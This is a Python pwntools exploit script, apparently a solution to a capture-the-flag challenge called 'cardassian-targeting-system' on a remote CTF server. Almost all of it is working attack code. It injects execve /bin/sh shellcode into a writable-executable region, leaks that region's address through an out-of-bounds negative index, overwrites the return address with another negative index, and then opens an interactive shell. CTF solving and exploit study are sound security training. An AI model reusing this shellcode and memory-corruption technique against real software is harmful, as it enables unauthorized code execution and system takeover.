from pwn import *


# p = process('./cardassian-targeting-system')
# gdb.attach(p, gdbscript='b *performAction+527')

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
print(disasm(shellcode))

p = remote("spaceheroes-cardassian-targeting-system.chals.io", 443, ssl=True, sni="spaceheroes-cardassian-targeting-system.chals.io")

print(p.recvuntil(b'Please enter your name and rank >>> ').decode(errors="ignore"))
p.sendline(shellcode) # shellcode will be written to rwx section
print(p.recvuntil(b'>>> ').decode(errors="ignore"))
p.sendline(b'4') # leak rwx section address
print(p.recvuntil(b'Which target will you list? >>> ').decode(errors="ignore"))
p.sendline(b'-1') # leak rwx section address

resp = p.recv()
offset = resp.find(b'coordinates:') + len('coordinates:') + 1
rwx_section_addr = int(resp[offset:offset+14].decode(errors="ignore"))
print(f"RWX SECTION ADDR: {hex(rwx_section_addr)}")

p.sendline(b'3') # rewrite return address to rwx section
print(p.recvuntil(b'Which target will you modify? >>> ').decode(errors="ignore"))
p.sendline(b'-3') # rewrite return address to rwx section
print(p.recvuntil(b'>>> ').decode(errors="ignore"))
p.sendline(str(rwx_section_addr).encode())
p.interactive()
